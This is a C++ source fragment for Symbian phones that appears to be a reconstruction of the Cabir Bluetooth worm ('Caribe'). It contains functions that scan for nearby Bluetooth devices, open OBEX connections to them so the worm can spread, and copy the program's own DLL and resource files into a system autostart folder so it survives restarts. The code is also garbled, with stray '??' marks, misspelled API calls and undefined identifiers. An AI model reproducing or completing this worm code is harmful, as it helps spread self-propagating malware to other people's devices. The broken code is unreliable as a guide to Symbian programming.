/*
cabir through Rhost of Resolver class,this is perfessional find bluetooth device the class
            able:take communication list in the programming and the bluetooth can connect
            don't must whole peoples' connect!
*/

#define AUTOSTARTABLERSC "C:\\SYSTEM\\SYMBIANSECUREDATA\\CARIBESECURITYMANAGER\\CARIBE.RSC"
_LIT(Autostartablerscstr,"C:\\SYSTEM\\SYMBIANSECUREDATA\\CARIBESECURITYMANAGER\\CARIBE.RSC");
#define AUTOSTARTABLEPATH "C:\\SYSTEM\\SYMBIANSECUREDATA\\CARIBESECURITYMANAGER\\"

int CaribeBluetooth::FindDevices()
//CaribeBluetooth is a class
{
    _LIT(KL2Cap,"BTLinkManager");
    int res;
    if((res=socketServ.Connect())!=KErrNone)
    {
        //connect wrong
        return 0;

    }
    if((res=socketServ.FindProtocol((const TProtocolName&)KL2Cap,PInfo))!=KErrNone)
    {
        //search wrong
        socketServ.Close();
        return 0;
    }
    if((res=hr.OPen(socketServ,pInfo.iAddrFamily,pInfo.iProtocol))!=KErrNone)
    {
        //open port wrong
        socketServ.Close();
        return 0;

    }
    WithAddress=0;
    addr.SetIAC(KGIAC);
    addr.SetAction(KHostResInquiry);
    TRequestStatus iStatusIn;
    hr.GetByAddress(addr,entry,iStatusIn);
    user::WaitForRequest(iStatusIn);

    if(iStatusIn!=KErrNone)
    {
        //error message ("don't identify devices");

    }
    else
    {
        WidthAddress=1;
    }
    socketServ.close();
    return 0;
}

int CaribeBluetooth::ManageFoundDevices()
// CaribeBluetooth is class name,and ManagerFoundDevices is way
{
    if(WithAddress)
    {
        WithAddress=0;
        Cancel();
        TBTSockAddr btaddr(entry().iAddr);
        TBTDevAddr devAddr;
        devAddr=btaddr.BTAddr();??
        TObexBluetoothProtocolInfo obexBTProtoInfo;//It's include gools for devices the everthing

        obexBTProtoInfo.iTransport.Copy(_L("RFCOMM"));
        obexBTProtoInfo.iAddr.SetBTAddr(devAddr);
        obexBTProtoInfo.iAddr.SetPort(0x00000009);
        obexClient=CObexClient::NewL(obexBTProtoInfo);//the class task connect bluetooth devices(all)

        if(obexClient)
        {
            iState=1;
            iStatus=KRequestPending;
            Cancel();
            obexClient->Connect(iStatus);
            SetActive();
        }
    }
    else
    {
        iState=3;
        User::After(1000000);
    }
    return 0;
}
void CaribeInstaller::CopyMeToAutostartableDir(CAknApplication * OwnApp)
{
    TFileName OwnDllName=Own0App->DllName();
    TBuf16<sizeof(AUTOSTARTABLE)>Autostartable(Autostartablestr);
    OwnDllName.UpperCase();
    if(OwnDllName==Autostartable)
    {
        return;
    }
    RFs fs;
    User::leaveIfError(fs.Connect());
    TBuf16 <sizeof(AUTOSTARTABLEPATH)>autostartablepath(Autostartablepathstr);?
    fs.MkDirAll(Autostartablepathstr);
    if(BaflUtils::CopyFile(fs,OwnDllName,Autostartable,CFileMan::EOverWrite)!=KErrNone)
    {
        fs.Close();
        return;
    }
    TBuf16 <sizeof(AUTOSTARTABLERSC)>Autostartablersc (Autostartablerscstr);
    OwnDllName[OwnDllName.Length()-3]='R';
    OwnDllName[OwnDllName.Length()-2]='S';
    OwnDllName[OwnDllName.Length()-1]='C';
    if(Baflutils::CopyFile(fs,OwnDllName,Autostartablersc,CFileMan::EOverWrite)!=KErrNone)
    {
        Baflutils::DeleteFile(fs,Autostartable,0);
    }
    fs.close();
    return;
}